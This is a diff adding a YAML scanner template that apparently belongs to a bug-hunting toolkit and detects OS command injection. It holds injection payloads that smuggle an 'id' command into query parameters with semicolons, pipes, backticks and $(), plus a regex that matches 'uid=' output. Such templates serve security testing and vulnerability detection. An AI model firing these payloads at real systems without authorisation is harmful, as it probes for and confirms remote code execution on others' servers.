@@ -1,0 +1,27 @@
+id: m7-cmdi-basic
+info:
+  name: M7 - OS Command Injection Basic
+  author: Sharlix
+  severity: critical
+  description: Basic command injection detection via sleep/id payloads
+  tags: cmdi,rce,m7hunter
+  reference:
+    - https://portswigger.net/web-security/os-command-injection
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?host=127.0.0.1;id"
+      - "{{BaseURL}}?ip=127.0.0.1|id"
+      - "{{BaseURL}}?ping=127.0.0.1`id`"
+      - "{{BaseURL}}?cmd=id"
+      - "{{BaseURL}}?exec=id"
+      - "{{BaseURL}}?command=id"
+      - "{{BaseURL}}?run=id"
+      - "{{BaseURL}}?q=127.0.0.1$(id)"
+
+    matchers:
+      - type: regex
+        regex:
+          - "uid=\d+\(.*?\)"
+        part: body
